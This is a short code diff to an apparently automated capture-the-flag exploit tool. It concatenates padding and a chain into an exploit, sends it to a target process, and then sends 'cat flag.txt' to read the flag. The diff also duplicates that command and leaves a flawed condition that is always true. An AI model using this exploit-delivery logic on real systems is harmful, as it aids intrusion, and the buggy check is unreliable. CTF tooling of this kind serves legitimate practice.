@@ -274,6 +274,7 @@ class Against:
         """Send the exploit that was generated."""
         #aegis_log.info(f"Sending exploit with padding {self.padding} and chain {self.chain}")
         aegis_log.info(f"Sending chain as {self.chain}") 
+        self.exploit = self.padding + self.chain
         if self.exploit != None:
             if self.debug == True:
                 self.process.sendline(self.exploit)
@@ -288,12 +289,15 @@ class Against:
             aegis_log.info(f"Exploit works got flag {self.flag}")
             return True
         else:
+            aegis_log.warning(f"Exploit failed")
             return False
 
     def recieve_flag(self):
         """Return the flag after parsing it from the binary."""
         try:
             self.process.sendline(b"cat flag.txt")
+            self.process.sendline(b"cat flag.txt")
+
             output = self.process.recvall(timeout=2)
             aegis_log.info(f"Recieved output {output}")
             if b"{" in output and b"}":
